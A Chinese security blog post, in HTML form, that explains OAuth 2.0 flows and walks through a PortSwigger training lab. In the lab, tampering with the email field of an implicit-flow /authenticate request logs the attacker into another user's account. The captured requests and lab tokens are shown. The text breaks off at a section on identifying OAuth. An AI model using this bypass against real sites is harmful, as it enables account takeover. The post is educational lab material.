@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言在浏览网页时，所有人肯定都遇到过允许用户使用社交媒体帐户登录的网站（QQ、Twitter、Google…）。这个特性很可能是使用流行的OAuth 2.0框架构建的。OAuth 2.0非常常见，而且有一些容易出现错误，而这可能会导致许多漏洞，使攻击者能够获取敏感用户数据，并可能完全绕过身份验证。下面将介绍如何识别和利用OAuth 2.0身份验证机制中发现的一些关键漏洞，然后还将探讨OAuth的O">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OAuth2.0身份验证中的漏洞">
+<meta property="og:url" content="http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="踟蹰者的歌">
+<meta property="og:description" content="前言在浏览网页时，所有人肯定都遇到过允许用户使用社交媒体帐户登录的网站（QQ、Twitter、Google…）。这个特性很可能是使用流行的OAuth 2.0框架构建的。OAuth 2.0非常常见，而且有一些容易出现错误，而这可能会导致许多漏洞，使攻击者能够获取敏感用户数据，并可能完全绕过身份验证。下面将介绍如何识别和利用OAuth 2.0身份验证机制中发现的一些关键漏洞，然后还将探讨OAuth的O">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/8sajo4pZQgLNKlz.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/B1685vPYxSTiclE.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/A3XsOe6WicUtmLZ.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/mu1bUB6djKfWR8s.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/dXvrCD1sIVNKQGy.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/XMzELCpIx853Db7.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/e5BPSlIU2xGYHaf.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/TXUj8nS4zFLGRtA.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/tnfv4pQWLRYXuyj.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/GE6j851OFieNCmA.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/rD9eaPl7IcpWHM3.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/UxQ4yroSLTGX9pn.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/CQzY52JlLtjsShX.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/14/a2bwdMgnYJxpPSQ.png">
+<meta property="article:published_time" content="2023-10-04T15:29:53.000Z">
+<meta property="article:modified_time" content="2024-01-14T10:58:35.508Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="WebSecurity">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/01/14/8sajo4pZQgLNKlz.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>OAuth2.0身份验证中的漏洞</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/10/04/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/10/04/OpenID%20connect%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&text=OAuth2.0身份验证中的漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=OAuth2.0身份验证中的漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&is_video=false&description=OAuth2.0身份验证中的漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=OAuth2.0身份验证中的漏洞&body=Check out this article: http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=OAuth2.0身份验证中的漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=OAuth2.0身份验证中的漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=OAuth2.0身份验证中的漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=OAuth2.0身份验证中的漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&name=OAuth2.0身份验证中的漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/04/OAuth2.0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E/&t=OAuth2.0身份验证中的漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFOAuth"><span class="toc-number">2.</span> <span class="toc-text">什么是OAuth?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OAuth-2-0-%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%A1%8C%E7%9A%84"><span class="toc-number">3.</span> <span class="toc-text">OAuth 2.0 是怎么运行的?</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">隐式授权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%88%E6%9D%83%E7%A0%81%E6%96%B9%E5%BC%8F"><span class="toc-number">3.2.</span> <span class="toc-text">授权码方式</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OAuth-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D"><span class="toc-number">4.</span> <span class="toc-text">OAuth 身份验证机制介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.1.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OAuth%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%A6%82%E4%BD%95%E4%BA%A7%E7%94%9F%E7%9A%84%EF%BC%9F"><span class="toc-number">5.</span> <span class="toc-text">OAuth身份验证漏洞是如何产生的？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%86%E5%88%ABOAuth%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">6.</span> <span class="toc-text">识别OAuth身份验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Recon"><span class="toc-number">7.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8OAuth%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">8.</span> <span class="toc-text">如何利用OAuth身份验证漏洞？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OAuth%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.</span> <span class="toc-text">OAuth客户端应用程序中的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83%E7%B1%BB%E5%9E%8B%E4%B8%AD%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8D%E9%80%82%E5%BD%93"><span class="toc-number">9.1.</span> <span class="toc-text">隐式授权类型中的实现不适当</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%BA%E4%B9%8FCSRF%E4%BF%9D%E6%8A%A4"><span class="toc-number">9.2.</span> <span class="toc-text">缺乏CSRF保护</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2authorization-codes%E5%92%8Caccess-tokens"><span class="toc-number">9.3.</span> <span class="toc-text">泄露authorization codes和access tokens</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E9%87%8D%E5%AE%9A%E5%90%91URI%E9%AA%8C%E8%AF%81"><span class="toc-number">9.4.</span> <span class="toc-text">有缺陷的重定向URI验证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E9%A1%B5%E9%9D%A2%E7%AA%83%E5%8F%96%E4%BB%A3%E7%A0%81%E5%92%8C%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C"><span class="toc-number">9.5.</span> <span class="toc-text">通过代理页面窃取代码和访问令牌</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">9.5.1.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B2"><span class="toc-number">9.5.2.</span> <span class="toc-text">示例2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#scope%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">10.</span> <span class="toc-text">scope验证绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%88%E6%9D%83%E7%A0%81%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">10.1.</span> <span class="toc-text">授权码模式下的权限提升</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83%E4%B8%8B%E7%9A%84%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">10.2.</span> <span class="toc-text">隐式授权下的权限提升</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AA%E7%BB%8F%E9%AA%8C%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C"><span class="toc-number">11.</span> <span class="toc-text">未经验证的用户注册</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        OAuth2.0身份验证中的漏洞
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-04T15:29:53.000Z" class="dt-published" itemprop="datePublished">2023-10-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/WebSecurity/" rel="tag">WebSecurity</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>在浏览网页时，所有人肯定都遇到过允许用户使用社交媒体帐户登录的网站（QQ、Twitter、Google…）。这个特性很可能是使用流行的OAuth 2.0框架构建的。OAuth 2.0非常常见，而且有一些容易出现错误，而这可能会导致许多漏洞，使攻击者能够获取敏感用户数据，并可能完全绕过身份验证。<br>下面将介绍如何识别和利用OAuth 2.0身份验证机制中发现的一些关键漏洞，然后还将探讨OAuth的OpenID Connect扩展中的一些漏洞。</p>
+<h4 id="什么是OAuth"><a href="#什么是OAuth" class="headerlink" title="什么是OAuth?"></a>什么是OAuth?</h4><p>OAuth是一种常用的授权框架，它使网站和web应用程序能够请求对另一个应用程序上用户帐户的受限制的访问。重要的是，OAuth允许用户在不向发起请求的应用程序公开其登录凭据的情况下授予此访问权限。这意味着用户可以调整他们想要共享的数据，而不必完全将帐户的控制权交给第三方。</p>
+<p>基本OAuth过程被广泛用于集成第三方功能，这些功能需要从用户帐户访问某些数据。例如，应用程序可能使用OAuth请求访问用户的电子邮件联系人列表，以便可以推荐联系人。然而，同样的机制也用于提供第三方身份验证服务，允许用户使用不同网站的帐户登录。</p>
+<p>PS：虽然OAuth 2.0是当前的标准，但一些网站仍然使用旧版的1a。OAuth 2.0是从零开始编写的，而不是直接从OAuth 1.0开发的。因此，两者非常不同。上述“OAuth”仅指OAuth 2.0。</p>
+<h4 id="OAuth-2-0-是怎么运行的"><a href="#OAuth-2-0-是怎么运行的" class="headerlink" title="OAuth 2.0 是怎么运行的?"></a>OAuth 2.0 是怎么运行的?</h4><p>OAuth 2.0最初是作为在应用程序之间共享对特定数据的访问而开发的。它通过定义三个不同方（即客户端应用程序、资源所有者和OAuth服务提供者）之间的一系列交互来工作。</p>
+<ul>
+<li>resource owner：资源所有者，指终端的“用户”（user）</li>
+<li>resource server：资源服务器，即服务提供商存放受保护资源。访问这些资源，需要获得访问令牌（access token）。</li>
+<li>client：客户端，代表向受保护资源进行资源请求的第三方应用程序。</li>
+<li>authorization server： 授权服务器， 在验证资源所有者并获得授权成功后，将发放访问令牌给客户端。</li>
+</ul>
+<p>基本OAuth过程（图是隐式授权）：</p>
+<p><a href="https://smms.app/image/8sajo4pZQgLNKlz" target="_blank"><img src="https://s2.loli.net/2024/01/14/8sajo4pZQgLNKlz.png" ></a></p>
+<h5 id="隐式授权"><a href="#隐式授权" class="headerlink" title="隐式授权"></a>隐式授权</h5><p>用户在A网站点击“使用B登录”，浏览器跳转到B网站的授权页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://b.com/auth2/access_token?response_type=token&amp;client_id=$&#123;client_id&#125;&amp;redirect_uri=$&#123;redirect_uri&#125;</span><br></pre></td></tr></table></figure>
+
+<p>response_type参数为token，表示要求直接返回令牌</p>
+<p>用户授权后，B跳回redirect_uri指定的网址，并带上令牌</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://a.com/callback#token=$&#123;access_token&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="授权码方式"><a href="#授权码方式" class="headerlink" title="授权码方式"></a>授权码方式</h5><p>第三方网站或APP先向授权服务器申请一个授权码（用户确认授权后，授权服务器将授权码返回给第三方网站），然后第三方网站或APP后台用授权码去申请访问令牌</p>
+<p>用户在A网站点击“使用B登录”，浏览器跳转到B网站的授权页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://b.com/auth2/code?response_type=code&amp;client_id=$&#123;client_id&#125;&amp;redirect_uri=$&#123;callback_uri&#125;&amp;scope=user_info</span><br></pre></td></tr></table></figure>
+
+<p>在授权页面，用户确认授权后，B回调A网站的链接，返回授权码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://a.com/authorize?code=$&#123;code&#125;</span><br></pre></td></tr></table></figure>
+
+<p>A后台接收到授权码后，用授权码向B申请access_token</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://b.com/auth2/access_token?grant_type=authorization_code&amp;client_id=$&#123;client_id&#125;&amp;client_secret=$&#123;client_secret&#125;&amp;code=$&#123;code&#125;&amp;redirect_uri=$&#123;redirect_uri&#125;</span><br></pre></td></tr></table></figure>
+
+<p>B回调A，或直接返回access token</p>
+<p>然后A调用B的接口，用access_token和openId来获取用户账号信息等</p>
+<h4 id="OAuth-身份验证机制介绍"><a href="#OAuth-身份验证机制介绍" class="headerlink" title="OAuth 身份验证机制介绍"></a>OAuth 身份验证机制介绍</h4><p>虽然OAuth最初不是为了这个目的，但它已经演变成了一种验证用户的方法。例如，很多人可能熟悉许多网站提供的选项，即使用现有的社交媒体帐户登录，而不必在相关网站注册。每当您看到这个选项时，它很有可能是基于OAuth 2.0构建的。</p>
+<p>对于OAuth身份验证机制，基本OAuth的过程基本上保持不变；主要区别在于客户端应用程序如何使用它接收的数据。从最终用户的角度来看，OAuth认证的结果与基于SAML的单点登录（SSO）非常相似。</p>
+<p>OAuth身份验证通常实现如下：</p>
+<ul>
+<li>用户选择使用其社交媒体帐户登录的选项。然后，客户端应用程序使用社交媒体站点的OAuth服务请求访问一些数据，这些数据可以用来识别用户。例如，这可能是用他们的帐户注册的电子邮件地址。</li>
+<li>在接收到访问令牌后，客户端应用程序从资源服务器（通常是从某个专用的&#x2F;userinfo端点）请求该数据。</li>
+<li>一旦接收到数据，客户端应用程序就使用它代替用户名来登录用户。通常使用从授权服务器接收的访问令牌代替传统密码。</li>
+</ul>
+<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow</span><br></pre></td></tr></table></figure>
+
+<p>该实验使用OAuth服务允许用户使用其社交媒体帐户登录。客户端应用程序的缺陷验证使得攻击者可以在不知道其他用户密码的情况下登录到他们的帐户。<br>实验要求是登录Carlos的帐户，只知道Carlos的电子邮件地址是<a href="mailto:carlos@carlos-montoya.net">carlos@carlos-montoya.net</a>.<br>可以使用以下凭据登录自己的社交媒体帐户：wiener:peter。</p>
+<p>点击登录，会跳转到社交账号登陆的页面</p>
+<p><a href="https://smms.app/image/B1685vPYxSTiclE" target="_blank"><img src="https://s2.loli.net/2024/01/14/B1685vPYxSTiclE.png" ></a></p>
+<p>第一次认证的时候会向认证服务器请求access_token</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /auth?client_id=dsk3db30175uumrbmys48&amp;redirect_uri=https://0a3a00ee03e7786fc0c31d91005300bc.web-security-academy.net/oauth-callback&amp;response_type=token&amp;nonce=-1784383316&amp;scope=openid%20profile%20email HTTP/1.1</span><br><span class="line">Host: oauth-0a47007d03d278bcc0301b51023000c0.web-security-academy.net</span><br><span class="line">Cookie: _session=UviLtxmKo6C9xQ-hxsGIC; _session.legacy=UviLtxmKo6C9xQ-hxsGIC</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>然后访问&#x2F;oauth-callback，访问的时候url里会带着前面请求得到的token</p>
+<p>此时服务器的返回如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 734</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));</span><br><span class="line">//从url里获取access_token</span><br><span class="line">const token = urlSearchParams.get(&#x27;access_token&#x27;);</span><br><span class="line">//从/me接口中获取用户的数据信息</span><br><span class="line">fetch(&#x27;https://oauth-0a47007d03d278bcc0301b51023000c0.web-security-academy.net/me&#x27;, &#123;</span><br><span class="line">    method: &#x27;GET&#x27;,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token,</span><br><span class="line">        &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.then(r =&gt; r.json())</span><br><span class="line">//以POST方式向/authenticate进行认证</span><br><span class="line">.then(j =&gt; </span><br><span class="line">    fetch(&#x27;/authenticate&#x27;, &#123;</span><br><span class="line">        method: &#x27;POST&#x27;,</span><br><span class="line">        headers: &#123;</span><br><span class="line">            &#x27;Accept&#x27;: &#x27;application/json&#x27;,</span><br><span class="line">            &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        body: JSON.stringify(&#123;</span><br><span class="line">            email: j.email,</span><br><span class="line">            username: j.sub,</span><br><span class="line">            token: token</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;).then(r =&gt; document.location = &#x27;/&#x27;))</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>向&#x2F;authenticate进行认证的请求数据包如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /authenticate HTTP/1.1</span><br><span class="line">Host: 0a3a00ee03e7786fc0c31d91005300bc.web-security-academy.net</span><br><span class="line">Cookie: session=RlxEkyW1Av8Y2vKIAvKN9DyufNrrxX6D</span><br><span class="line">...</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;email&quot;:&quot;wiener@hotdog.com&quot;,</span><br><span class="line">	&quot;username&quot;:&quot;wiener&quot;,</span><br><span class="line">	&quot;token&quot;:&quot;Sut4BUo9I3fN-G_5t_26QT21YRXltU9O_ctKmCTUDrz&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只需要把email换成Carlos的email就可以以Carlos用户进行登录了</p>
+<h4 id="OAuth身份验证漏洞是如何产生的？"><a href="#OAuth身份验证漏洞是如何产生的？" class="headerlink" title="OAuth身份验证漏洞是如何产生的？"></a>OAuth身份验证漏洞是如何产生的？</h4><p>OAuth身份验证漏洞的部分原因是OAuth规范在设计上相对模糊和灵活。尽管每种授权类型的基本功能都需要一些强制性组件，但绝大多数实现是完全可选的。这包括许多保持用户数据安全所必需的配置设置。</p>
+<p>OAuth的另一个关键问题是普遍缺乏内置的安全特性。安全性几乎完全依赖于开发人员使用正确的配置选项组合，并在实现他们自己的附加安全措施，例如输入验证。</p>
+<h4 id="识别OAuth身份验证"><a href="#识别OAuth身份验证" class="headerlink" title="识别OAuth身份验证"></a>识别OAuth身份验证</h4><p>识别应用程序何时使用OAuth身份验证相对简单。如果看到从其他网站使用帐户登录的选项，这基本上表明正在使用OAuth。<br>识别OAuth身份验证的最可靠方法是观察流量，并在使用此登录选项时检查相应的HTTP消息。无论使用哪种OAuth授权类型，认证过程的第一个请求将始终是对认证服务器端点的请求，其中包含许多专门用于OAuth的查询参数。尤其要注意client_id、redirect_uri和response_type参数。例如，授权请求通常如下所示：</p>
